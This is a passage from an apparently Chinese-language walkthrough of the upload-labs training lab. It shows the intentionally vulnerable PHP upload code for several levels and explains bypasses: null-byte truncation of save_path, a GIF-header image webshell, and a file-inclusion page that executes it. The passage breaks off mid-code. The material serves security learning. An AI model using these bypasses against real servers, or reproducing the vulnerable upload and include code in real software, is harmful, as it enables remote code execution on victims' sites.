        <span class="token variable">$temp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'save_path'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">"/"</span><span class="token operator">.</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">99</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token function">date</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"YmdHis"</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"."</span><span class="token operator">.</span><span class="token variable">$file_ext</span><span class="token punctuation">;</span>

        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">,</span><span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'上传出错！'</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"只允许上传.jpg|.png|.gif类型文件！"</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>白名单判断，但$img_path是直接拼接，因此可以利用%00截断绕过。</p>
<p>截断条件：<code>php版本小于5.3.4，php的magic_quotes_gpc为OFF状态</code></p>
<img src="/2021/07/03/upload-labs-tong-guan-ji-lu/165852.png" class title="image">
<img src="/2021/07/03/upload-labs-tong-guan-ji-lu/165946.png" class title="image">
<h1 id="Pass-13-00截断"><a href="#Pass-13-00截断" class="headerlink" title="Pass-13 00截断"></a>Pass-13 00截断</h1><p>源码：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
<span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$ext_arr</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'jpg'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'png'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'gif'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token function">strrpos</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"."</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">,</span><span class="token variable">$ext_arr</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$temp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'save_path'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">"/"</span><span class="token operator">.</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">99</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token function">date</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"YmdHis"</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"."</span><span class="token operator">.</span><span class="token variable">$file_ext</span><span class="token punctuation">;</span>

        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">,</span><span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"上传失败"</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"只允许上传.jpg|.png|.gif类型文件！"</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>save_path参数通过POST方式传递，还是利用00截断，因为POST不会像GET对%00进行自动解码，所以需要在二进制中进行修改。</p>
<img src="/2021/07/03/upload-labs-tong-guan-ji-lu/170603.png" class title="image">
<img src="/2021/07/03/upload-labs-tong-guan-ji-lu/170734.png" class title="image">
<h1 id="Pass-14-图片马绕过"><a href="#Pass-14-图片马绕过" class="headerlink" title="Pass-14 图片马绕过"></a>Pass-14 图片马绕过</h1><p>源码：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">getReailFileType</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"rb"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$bin</span> <span class="token operator">=</span> <span class="token function">fread</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//只读2字节</span>
    <span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$strInfo</span> <span class="token operator">=</span> @<span class="token function">unpack</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"C2chars"</span><span class="token punctuation">,</span> <span class="token variable">$bin</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    
    <span class="token variable">$typeCode</span> <span class="token operator">=</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$strInfo</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'chars1'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token variable">$strInfo</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'chars2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    
    <span class="token variable">$fileType</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>    
    <span class="token keyword">switch</span><span class="token punctuation">(</span><span class="token variable">$typeCode</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>      
        <span class="token keyword">case</span> <span class="token number">255216</span><span class="token punctuation">:</span>            
            <span class="token variable">$fileType</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'jpg'</span><span class="token punctuation">;</span>
            <span class="token keyword">break</span><span class="token punctuation">;</span>
        <span class="token keyword">case</span> <span class="token number">13780</span><span class="token punctuation">:</span>            
            <span class="token variable">$fileType</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'png'</span><span class="token punctuation">;</span>
            <span class="token keyword">break</span><span class="token punctuation">;</span>        
        <span class="token keyword">case</span> <span class="token number">7173</span><span class="token punctuation">:</span>            
            <span class="token variable">$fileType</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'gif'</span><span class="token punctuation">;</span>
            <span class="token keyword">break</span><span class="token punctuation">;</span>
        <span class="token keyword">default</span><span class="token punctuation">:</span>            
            <span class="token variable">$fileType</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'unknown'</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>    
        <span class="token keyword">return</span> <span class="token variable">$fileType</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
<span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$temp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$file_type</span> <span class="token operator">=</span> <span class="token function">getReailFileType</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$file_type</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'unknown'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"文件未知，上传失败！"</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span><span class="token operator">.</span><span class="token string double-quoted-string">"/"</span><span class="token operator">.</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">99</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token function">date</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"YmdHis"</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"."</span><span class="token operator">.</span><span class="token variable">$file_type</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">,</span><span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"上传出错！"</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>通过读文件的前2个字节判断文件类型，因此直接上传图片马即可，制作图片马</p>
<p>1.gif</p>
<pre class="line-numbers language-none"><code class="language-none">GIF89a
&lt;?php phpinfo();?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<img src="/2021/07/03/upload-labs-tong-guan-ji-lu/171734.png" class title="image">
<p>直接访问图片并不能把图片当做PHP解析，因此还需要利用文件包含漏洞</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token comment">/*
本页面存在文件包含漏洞，用于测试图片马是否能正常运行！
*/</span>
<span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Content-Type:text/html;charset=utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">include</span> <span class="token variable">$file</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
    <span class="token function">show_source</span><span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<img src="/2021/07/03/upload-labs-tong-guan-ji-lu/171702.png" class title="image">
<h1 id="Pass-15-getimagesize-绕过"><a href="#Pass-15-getimagesize-绕过" class="headerlink" title="Pass-15 getimagesize()绕过"></a>Pass-15 getimagesize()绕过</h1><p>源码：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">isImage</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$types</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'.jpeg|.png|.gif'</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$info</span> <span class="token operator">=</span> <span class="token function">getimagesize</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$ext</span> <span class="token operator">=</span> <span class="token function">image_type_to_extension</span><span class="token punctuation">(</span><span class="token variable">$info</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">stripos</span><span class="token punctuation">(</span><span class="token variable">$types</span><span class="token punctuation">,</span><span class="token variable">$ext</span><span class="token punctuation">)</span><span class="token operator">>=</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token keyword">return</span> <span class="token variable">$ext</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
            <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
<span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$temp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">isImage</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$res</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"文件未知，上传失败！"</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span><span class="token operator">.</span><span class="token string double-quoted-string">"/"</span><span class="token operator">.</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">99</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token function">date</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"YmdHis"</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token variable">$res</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">,</span><span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"上传出错！"</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>用getimagesize函数判断文件类型，还是可以图片马绕过，方法同pass-14</p>
<h1 id="Pass-16-exif-imagetype-绕过"><a href="#Pass-16-exif-imagetype-绕过" class="headerlink" title="Pass-16 exif_imagetype()绕过"></a>Pass-16 exif_imagetype()绕过</h1><p>源码：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">isImage</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token comment">//需要开启php_exif模块</span>
    <span class="token variable">$image_type</span> <span class="token operator">=</span> <span class="token function">exif_imagetype</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">switch</span> <span class="token punctuation">(</span><span class="token variable">$image_type</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">case</span> <span class="token constant">IMAGETYPE_GIF</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> <span class="token string double-quoted-string">"gif"</span><span class="token punctuation">;</span>
            <span class="token keyword">break</span><span class="token punctuation">;</span>
        <span class="token keyword">case</span> <span class="token constant">IMAGETYPE_JPEG</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> <span class="token string double-quoted-string">"jpg"</span><span class="token punctuation">;</span>
            <span class="token keyword">break</span><span class="token punctuation">;</span>
        <span class="token keyword">case</span> <span class="token constant">IMAGETYPE_PNG</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> <span class="token string double-quoted-string">"png"</span><span class="token punctuation">;</span>
            <span class="token keyword">break</span><span class="token punctuation">;</span>    
        <span class="token keyword">default</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
            <span class="token keyword">break</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
<span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$temp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">isImage</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$res</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"文件未知，上传失败！"</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span><span class="token operator">.</span><span class="token string double-quoted-string">"/"</span><span class="token operator">.</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">99</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token function">date</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"YmdHis"</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"."</span><span class="token operator">.</span><span class="token variable">$res</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">,</span><span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"上传出错！"</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>用exif_imagetype函数判断文件类型，还是可以图片马绕过，方法同pass-14</p>
<h1 id="Pass-17-二次渲染"><a href="#Pass-17-二次渲染" class="headerlink" title="Pass-17 二次渲染"></a>Pass-17 二次渲染</h1><p>源码：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
<span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token comment">// 获得上传文件的基本信息，文件名，类型，大小，临时文件路径</span>
    <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$filetype</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'type'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$tmpname</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

    <span class="token variable">$target_path</span><span class="token operator">=</span><span class="token constant">UPLOAD_PATH</span><span class="token operator">.</span><span class="token string single-quoted-string">'/'</span><span class="token operator">.</span><span class="token function">basename</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">// 获得上传文件的扩展名</span>
    <span class="token variable">$fileext</span><span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token function">strrchr</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"."</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">//判断文件后缀与类型，合法才进行上传操作</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$fileext</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"jpg"</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token variable">$filetype</span><span class="token operator">==</span><span class="token string double-quoted-string">"image/jpeg"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$tmpname</span><span class="token punctuation">,</span><span class="token variable">$target_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token comment">//使用上传的图片生成新的图片</span>
            <span class="token variable">$im</span> <span class="token operator">=</span> <span class="token function">imagecreatefromjpeg</span><span class="token punctuation">(</span><span class="token variable">$target_path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$im</span> <span class="token operator">==</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
                <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"该文件不是jpg格式的图片！"</span><span class="token punctuation">;</span>
                @<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$target_path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
                <span class="token comment">//给新图片指定文件名</span>
                <span class="token function">srand</span><span class="token punctuation">(</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
